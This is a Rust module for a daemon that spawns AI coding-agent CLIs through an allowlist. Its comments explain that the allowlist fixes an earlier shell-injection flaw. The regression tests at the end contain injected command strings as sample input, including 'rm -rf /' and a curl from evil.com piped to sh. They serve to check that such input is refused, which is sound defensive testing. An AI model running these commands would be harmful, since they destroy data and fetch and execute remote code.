use anyhow::Result;
use std::sync::Arc;
use std::time::Duration;
use tokio::process::Command;
use tokio::sync::RwLock;
use tokio::time::timeout;
use uuid::Uuid;

use crate::daemon::state::DaemonState;

/// Resolves an agent identity to its `(program, args)` invocation — never a
/// shell. Mirrors `agent_runner::canonical_agent_identity`'s accepted input
/// forms so both handoff-delivery paths (the WS `Handover` command that
/// calls `spawn_agent` below, and `raios run`/`raios task` in
/// `agent_runner.rs`) treat the same identity string the same way.
///
/// Returns `None` for anything unrecognized instead of falling through to a
/// shell: the previous implementation ran `sh -lc <agent_name>` (Unix) /
/// `powershell -Command <agent_name>` (Windows) with `agent_name` taken
/// verbatim from the WS client's `target` field (`daemon/handlers.rs`'s
/// `"Handover"` command) — an unauthenticated-content shell injection, only
/// not live-exploitable today because `Handover` happens to default to
/// `action = "confirm"` in `raios-policy.toml` (see `security/umai.rs`),
/// which is a policy setting, not a code guarantee.
fn agent_command(agent_name: &str) -> Option<(&'static str, Vec<String>)> {
    match agent_name.trim().to_lowercase().as_str() {
        "claude" | "claude_kaira" => Some(("claude", vec![])),
        "codex" | "codex_kaira" => Some(("codex", vec![])),
        "opencode" | "opencode_kaira" => Some(("opencode", vec![])),
        "antigravity" | "agy" | "antigravity_kaira" => Some(("agy", vec![])),
        _ => None,
    }
}

/// Representation of an active agent process.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct AgentProcess {
    pub id: Uuid,
    pub name: String,
    pub status: String,
    pub started_at: std::time::SystemTime,
    pub logs: Vec<String>,
}

#[derive(Clone)]
pub struct ExecutionProxy {
    state: Arc<RwLock<DaemonState>>,
    event_tx: Option<tokio::sync::broadcast::Sender<String>>,
}

impl ExecutionProxy {
    pub fn new(state: Arc<RwLock<DaemonState>>) -> Self {
        Self {
            state,
            event_tx: None,
        }
    }

    pub fn with_event_tx(mut self, tx: tokio::sync::broadcast::Sender<String>) -> Self {
        self.event_tx = Some(tx);
        self
    }

    fn push_event(&self, event: serde_json::Value) {
        if let Some(tx) = &self.event_tx {
            let _ = tx.send(event.to_string());
        }
    }

    /// Spawns an agent in an isolated environment with a Death Timer.
    ///
    /// `agent_name` must resolve via `agent_command` to one of the four
    /// canonical agent identities — anything else is refused before any
    /// process state is touched. No ambient authority: an unrecognized
    /// identity is not a "best effort" shell invocation, it's an error.
    pub async fn spawn_agent(
        &self,
        agent_name: &str,
        project_path: &str,
        timeout_secs: u64,
    ) -> Result<String> {
        let (program, program_args) = agent_command(agent_name).ok_or_else(|| {
            anyhow::anyhow!(
                "Unknown agent identity '{}' — refusing to spawn",
                agent_name
            )
        })?;

        let process_id = Uuid::new_v4();

        // Register the process in state
        let agent_proc = AgentProcess {
            id: process_id,
            name: agent_name.to_string(),
            status: "Running".to_string(),
            started_at: std::time::SystemTime::now(),
            logs: Vec::new(),
        };

        {
            let mut state_lock = self.state.write().await;
            state_lock.active_agents.push(agent_proc.clone());
        }

        self.push_event(serde_json::json!({
            "event": "AgentStarted",
            "agent_id": process_id.to_string(),
            "name": agent_name,
            "project_path": project_path,
        }));

        println!(
            "[Proxy] Spawning agent '{}' (ID: {}) with {}s death timer",
            agent_name, process_id, timeout_secs
        );

        let agent_name_cloned = agent_name.to_string();
        let path_cloned = project_path.to_string();
        let state_cloned = self.state.clone();
        let event_tx_cloned = self.event_tx.clone();

        // Spawn a background task to handle the process execution
        tokio::spawn(async move {
            use std::process::Stdio;
            use tokio::io::{AsyncBufReadExt, BufReader};

            let mut cmd = Command::new(program);
            cmd.args(&program_args);
            cmd.current_dir(&path_cloned);
            cmd.stdout(Stdio::piped());
            cmd.stderr(Stdio::piped());

            // Wait for the child process to complete, with a timeout
            let result = match cmd.spawn() {
                Ok(mut child) => {
                    if let Some(stdout) = child.stdout.take() {
                        let state_for_logs = state_cloned.clone();
                        tokio::spawn(async move {
                            let mut reader = BufReader::new(stdout).lines();
                            while let Ok(Some(line)) = reader.next_line().await {
                                let mut s = state_for_logs.write().await;
                                if let Some(agent) =
                                    s.active_agents.iter_mut().find(|a| a.id == process_id)
                                {
                                    agent.logs.push(format!("[stdout] {}", line));
                                }
                            }
                        });
                    }

                    if let Some(stderr) = child.stderr.take() {
                        let state_for_err = state_cloned.clone();
                        tokio::spawn(async move {
                            let mut reader = BufReader::new(stderr).lines();
                            while let Ok(Some(line)) = reader.next_line().await {
                                let mut s = state_for_err.write().await;
                                if let Some(agent) =
                                    s.active_agents.iter_mut().find(|a| a.id == process_id)
                                {
                                    agent.logs.push(format!("[stderr] {}", line));
                                }
                            }
                        });
                    }

                    match timeout(Duration::from_secs(timeout_secs), child.wait()).await {
                        Ok(Ok(status)) => {
                            if status.success() {
                                "Completed Successfully"
                            } else {
                                "Exited with Error"
                            }
                        }
                        Ok(Err(_e)) => "Failed to wait on child",
                        Err(_) => {
                            println!("[Proxy] Death Timer triggered for agent '{}' (ID: {}). Terminating.", agent_name_cloned, process_id);
                            let _ = child.kill().await;
                            "Killed by Death Timer (Timeout)"
                        }
                    }
                }
                Err(_) => "Failed to spawn process",
            };

            // Update state
            let mut state_lock = state_cloned.write().await;
            if let Some(agent) = state_lock
                .active_agents
                .iter_mut()
                .find(|a| a.id == process_id)
            {
                agent.status = result.to_string();
            }

            if let Some(tx) = &event_tx_cloned {
                let _ = tx.send(
                    serde_json::json!({
                        "event": "AgentStopped",
                        "agent_id": process_id.to_string(),
                        "name": agent_name_cloned,
                        "final_status": result,
                    })
                    .to_string(),
                );
            }

            println!(
                "[Proxy] Agent '{}' (ID: {}) finished. Status: {}",
                agent_name_cloned, process_id, result
            );
        });

        Ok(process_id.to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::agent_command;

    #[test]
    fn agent_command_resolves_all_canonical_identities() {
        assert_eq!(agent_command("claude"), Some(("claude", vec![])));
        assert_eq!(agent_command("claude_kaira"), Some(("claude", vec![])));
        assert_eq!(agent_command("codex"), Some(("codex", vec![])));
        assert_eq!(agent_command("codex_kaira"), Some(("codex", vec![])));
        assert_eq!(agent_command("opencode"), Some(("opencode", vec![])));
        assert_eq!(agent_command("opencode_kaira"), Some(("opencode", vec![])));
        assert_eq!(agent_command("antigravity"), Some(("agy", vec![])));
        assert_eq!(agent_command("agy"), Some(("agy", vec![])));
        assert_eq!(agent_command("antigravity_kaira"), Some(("agy", vec![])));
    }

    #[test]
    fn agent_command_is_case_and_whitespace_insensitive() {
        assert_eq!(agent_command("  Claude  "), Some(("claude", vec![])));
        assert_eq!(agent_command("CODEX"), Some(("codex", vec![])));
    }

    /// Regression test for the shell-injection bug this module used to have:
    /// `agent_name` is client-supplied (WS `Handover` command's `target`
    /// field) and used to be handed straight to `sh -lc`/`powershell
    /// -Command`. Anything that isn't a known agent identity — including a
    /// deliberately shell-metacharacter-laden string — must be refused, not
    /// passed to a shell "best effort".
    #[test]
    fn agent_command_rejects_unknown_or_injection_looking_input() {
        assert_eq!(agent_command("claude; rm -rf /"), None);
        assert_eq!(agent_command("$(curl evil.com/x | sh)"), None);
        assert_eq!(agent_command(""), None);
        assert_eq!(agent_command("gemini"), None); // removed CLI, see 2026-06-22 changelog
    }

    #[tokio::test]
    async fn spawn_agent_rejects_unknown_identity_before_touching_state() {
        use super::{DaemonState, ExecutionProxy};
        use std::sync::Arc;
        use tokio::sync::RwLock;

        let state = Arc::new(RwLock::new(DaemonState::default()));
        let proxy = ExecutionProxy::new(state.clone());

        let result = proxy
            .spawn_agent("claude; touch /tmp/pwned", "/tmp", 5)
            .await;
        assert!(result.is_err());
        assert!(state.read().await.active_agents.is_empty());
    }
}
